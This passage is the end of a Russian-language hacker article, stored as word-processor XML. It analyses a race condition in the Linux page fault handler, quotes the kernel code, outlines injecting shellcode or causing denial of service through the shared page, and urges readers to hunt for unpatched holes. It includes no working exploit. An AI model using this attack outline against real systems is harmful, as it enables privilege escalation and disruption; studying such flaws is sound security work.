      <text:p text:style-name="P4"><text:tab/>down_read(&amp;mm-&gt;mmap_sem); /* * */</text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T10">vma = find_vma(mm, address); .</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T10">if (!vma)</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T9"><text:tab/><text:tab/></text:span><text:span text:style-name="T10">goto bad_area;</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T10">if (vma-&gt;vm_start &lt;= address)</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T9"><text:tab/><text:tab/></text:span><text:span text:style-name="T10">goto good_area;</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T10">if (!(vma-&gt;vm_flags &amp; VM_GROWSDOWN))</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T9"><text:tab/><text:tab/></text:span><text:span text:style-name="T10">goto bad_area;</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T10">if (error_code &amp; 4) {</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T10">/*</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T10">* accessing the stack below %esp is always a bug.</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T10">* The "+ 32" is there due to some instructions (like</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T10">* pusha) doing post-decrement on the stack and that</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T10">* doesn't show up until later..</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T10">*/</text:span></text:p>
      <text:p text:style-name="P4"><text:tab/>if (address + 32 &lt; regs-&gt;esp) /* * */</text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T9"><text:tab/><text:tab/></text:span><text:span text:style-name="T10">goto bad_area;</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T10">}</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T10">if (expand_stack(vma, address))</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T9"><text:tab/><text:tab/></text:span><text:span text:style-name="T10">goto bad_area;</text:span></text:p>
      <text:p text:style-name="P14">Листинг<text:span text:style-name="T1"> </text:span><text:sequence text:ref-name="refЛистинг5" text:name="Листинг" text:formula="ooow:Листинг+1" style:num-format="1">6</text:sequence> ключевой фрагмент функции /mm/fault.c, содержащий ошибку синхронизации</text:p>
      <text:p text:style-name="P12">Поскольку, <text:span text:style-name="T1">page</text:span> fault handler выполняется с семафором, доступным только-на-чтение, несколько конкурирующих потока могут одновременно войти в обработчик за строкой /*<text:span text:style-name="T1"> </text:span>*<text:span text:style-name="T1"> </text:span>*/. Рассмотрим, что произойдет, если два потока, разделяющих одну и туже виртуальную память, одновременно вызовут <text:span text:style-name="T1">page</text:span> fault handler. Приблизительный сценарий атаки выглядит так: <text:soft-page-break/>поток 1 обращается к сторожевой странице и вызывает исключение <text:span text:style-name="T1">fault</text:span>_1. Поток 2, обращается к странице <text:span text:style-name="T1">GUARD</text:span>_<text:span text:style-name="T1">PAGE</text:span> + <text:span text:style-name="T1">PAGE</text:span>_<text:span text:style-name="T1">SIZE</text:span> и вызывает исключение <text:span text:style-name="T1">fault</text:span>_2.</text:p>
      <text:p text:style-name="P11">Состояние виртуальной памяти при этом будет выглядеть так:</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P16">[ <text:s text:c="2"/>NOPAGE <text:s text:c="3"/>] [fault_1 <text:s text:c="5"/>] [ <text:s text:c="4"/>VMA <text:s text:c="4"/>] <text:s/>---&gt; <text:s/>higher <text:s/>addresses</text:p>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T14">[fault_2 <text:s text:c="5"/>] [ <text:s text:c="2"/>NOPAGE <text:s text:c="3"/>] [ <text:s text:c="4"/>VMA <text:s text:c="4"/>]</text:span></text:p>
      <text:p text:style-name="P14">Рисунок<text:span text:style-name="T1"> </text:span><text:sequence text:ref-name="refРисунок0" text:name="Рисунок" text:formula="ooow:Рисунок+1" style:num-format="1">1</text:sequence><text:span text:style-name="T1"> </text:span>состояние виртуальной памяти на момент вызова <text:span text:style-name="T1">page</text:span> fault handler'а двумя потоками</text:p>
      <text:p text:style-name="P12">Если поток 2 опередит поток 1 и первым выделит свою страницу <text:span text:style-name="T1">PAGE </text:span>1, поток 1 вызовет серьезное нарушение в работе менеджера виртуальной памяти, поскольку нижняя граница стека теперь находится выше <text:span text:style-name="T1">fault </text:span>2 и потому страница <text:span text:style-name="T1">PAGE </text:span>2 реально не выделяется, но становится доступной на чтение/запись обоим потокам, причем после завершения процесса она не будет удалена!</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T14">[ <text:s text:c="2"/>PAGE2 <text:s text:c="4"/>] [PAGE1 <text:s text:c="14"/>VMA <text:s text:c="4"/>]</text:span></text:p>
      <text:p text:style-name="P14">Рисунок <text:sequence text:ref-name="refРисунок1" text:name="Рисунок" text:formula="ooow:Рисунок+1" style:num-format="1">2</text:sequence> состояние виртуальной памяти на момент выхода из <text:span text:style-name="T1">page</text:span> fault handler'а</text:p>
      <text:p text:style-name="P12">Что находится в <text:span text:style-name="T1">PAGE </text:span>2? Зависит от состояния каталога страниц (<text:span text:style-name="T1">page</text:span> <text:span text:style-name="T1">table</text:span>). Поскольку в <text:span text:style-name="T1">LINUX</text:span> физическая память представляет собой своеобразный кэш виртуального адресного пространства, одна и та же страница в разное время может использоваться как ядром, так и пользовательскими приложениями (в том числе и привилегированными процессами).</text:p>
      <text:p text:style-name="P12">Дождавшись, когда в <text:span text:style-name="T1">PAGE</text:span>2 попадает код ядра или какого-нибудь привилегированного процесса (это легко определить по его сигнатуре), хакер может внедрить сюда <text:span text:style-name="T1">shell</text:span>-код, или просто устроить грандиозный <text:span text:style-name="T1">DoS</text:span>, забросав <text:span text:style-name="T1">PAGE</text:span>2 бессмысленным мусором. Несмотря на довольно почетный возраст этой уязвимости, готового эксплоита найти так и неудалость, однако, его нетрудно написать самостоятельно. Как именно это сделать написано здесь: http://www.isec.pl/vulnerabilities/isec-0022-pagefault.txt;</text:p>
      <text:p text:style-name="P11"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">заключение</text:h>
      <text:p text:style-name="P12">Долгое время <text:span text:style-name="T1">LINUX</text:span> считалась "правильной" операционной системой, надежно защищенной от вирусов и хакерских атак. Но это оказалось не так. Дыр в <text:span text:style-name="T1">LINUX</text:span>'е даже больше чем в <text:span text:style-name="T1">Windows</text:span>, и многие из них носят критический характер. Загрузчик <text:span text:style-name="T1">ELF</text:span>-файлов, это настоящее гнездо. Баги отсюда так и прут. Еще больше ошибок порождается поддержкой многопточности. Если в <text:span text:style-name="T1">Windows</text:span> потоки существовали изначально и проблемы синхронизации решались на фундаментальном уровне, то "чужеродная" для <text:span text:style-name="T1">LINUX</text:span>'а многопоточность была синхронизована впопыхах.</text:p>
      <text:p text:style-name="P12">Ошибки гнездятся вокруг семафоров. Ищите семафоры и вы найдете ошибки. Какой смысл использовать готовые эксплоиты, для которых уже существуют заплатки? Хакерский код получается слишком хлипким и нежизнеспособным. Активность администраторов растет с каждым днем, сервера оснащаются системами автоматического обновления и выживать в этом мире становится все труднее и труднее. Поэтому, необходимо вести самостоятельные исследования, уметь анализировать исходный и машинный код, обнаруживая еще никому неизвестные ошибки, противоядия против которых еще не существует.</text:p>
      <text:p text:style-name="P12">На заре истории человек с винтовкой мог завоевать мир. Так чем же мы хуже? Следующая статья этого цикла расскажет какие инструменты используются для анализа ядра и как хакеры разыскивают дыры.</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">&gt;&gt;&gt; врезка: интересные ссылки</text:h>
      <text:list xml:id="list5785271581578796686" text:style-name="WW8Num11">
        <text:list-item>
          <text:p text:style-name="P9"><text:span text:style-name="T1">Understanding the Linux Kernel</text:span></text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P8">доходчивое описание архитектуры ядра <text:span text:style-name="T1">LINUX</text:span>'а, настоящая настольная книга любого писателя <text:span text:style-name="T1">KERNEL</text:span>-эксплоитов (на английском языке) <text:span text:style-name="T4">http</text:span><text:span text:style-name="T17">://</text:span><text:span text:style-name="T4">cs</text:span><text:span text:style-name="T17">.</text:span><text:span text:style-name="T4">bilgi</text:span><text:span text:style-name="T17">.</text:span><text:span text:style-name="T4">edu</text:span><text:span text:style-name="T17">.</text:span><text:span text:style-name="T4">tr</text:span><text:span text:style-name="T17">/</text:span><text:span text:style-name="T4">pages</text:span><text:span text:style-name="T17">/</text:span><text:span text:style-name="T4">courses</text:span><text:span text:style-name="T17">/</text:span><text:span text:style-name="T4">year</text:span><text:span text:style-name="T17">_3/</text:span><text:span text:style-name="T4">comp</text:span><text:span text:style-name="T17">_306/</text:span><text:span text:style-name="T4">Resources</text:span><text:span text:style-name="T17">/</text:span><text:span text:style-name="T4">For</text:span><text:span text:style-name="T17">_</text:span><text:span text:style-name="T4">Understanding</text:span><text:span text:style-name="T17">_</text:span><text:span text:style-name="T4">Kernel</text:span><text:span text:style-name="T17">_</text:span><text:span text:style-name="T4">Codes</text:span><text:span text:style-name="T17">.</text:span><text:span text:style-name="T4">pdf</text:span>;</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P2">Common Security Exploit and Vulnerability Matrix v2.0</text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P8">красивый плакат с перечнем всех недавно обнаруженных дыр. распечатать и повестить на стену <text:span text:style-name="T19">www</text:span><text:span text:style-name="T18">.</text:span><text:span text:style-name="T19">tripwire</text:span><text:span text:style-name="T18">.</text:span><text:span text:style-name="T19">com</text:span><text:span text:style-name="T18">/</text:span><text:span text:style-name="T19">files</text:span><text:span text:style-name="T18">/</text:span><text:span text:style-name="T19">literature</text:span><text:span text:style-name="T18">/</text:span><text:span text:style-name="T19">poster</text:span><text:span text:style-name="T18">/</text:span><text:span text:style-name="T19">Tripwire</text:span><text:span text:style-name="T18">_</text:span><text:span text:style-name="T19">exploit</text:span><text:span text:style-name="T18">_</text:span><text:span text:style-name="T19">poster</text:span><text:span text:style-name="T18">.</text:span><text:span text:style-name="T19">pdf</text:span>;</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P2">Cyber Security Bulletins</text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P8"><text:soft-page-break/>бюллетени по безопасности с кратким описанием недавно обнаруженных дыр (на английском языке): <text:span text:style-name="T4">http</text:span><text:span text:style-name="T17">://</text:span><text:span text:style-name="T4">www</text:span><text:span text:style-name="T17">.</text:span><text:span text:style-name="T4">us</text:span><text:span text:style-name="T17">-</text:span><text:span text:style-name="T4">cert</text:span><text:span text:style-name="T17">.</text:span><text:span text:style-name="T4">gov</text:span><text:span text:style-name="T17">/</text:span><text:span text:style-name="T4">cas</text:span><text:span text:style-name="T17">/</text:span><text:span text:style-name="T4">bulletins</text:span><text:span text:style-name="T17">/</text:span>;</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P2">iSEC Security Research</text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P8">сайт продуктивной хакерской группы, обнаруживший множество интересных дыр (на английском языке): <text:span text:style-name="T4">http</text:span><text:span text:style-name="T17">://</text:span><text:span text:style-name="T4">www</text:span><text:span text:style-name="T17">.</text:span><text:span text:style-name="T4">isec</text:span><text:span text:style-name="T17">.</text:span><text:span text:style-name="T4">pl</text:span><text:span text:style-name="T17">/</text:span>;</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P8"><text:span text:style-name="T1">Tiger</text:span> <text:span text:style-name="T1">Team</text:span></text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P8">еще один хакерский сайт с кучей познавательных материалов на английском и швейцарских языках: <text:span text:style-name="T17">http://tigerteam.se/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5-23T19:07:00</dc:date>
    <meta:editing-cycles>315</meta:editing-cycles>
    <meta:editing-duration>PT15H40M</meta:editing-duration>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="6" meta:paragraph-count="174" meta:word-count="2028" meta:character-count="15490" meta:non-whitespace-character-count="13417"/>
    <meta:generator>LibreOffice/5.2.3.3$Linux_X86_64 LibreOffice_project/20m0$Build-3</meta:generator>
  </office:meta>
</office:document-meta>
</file>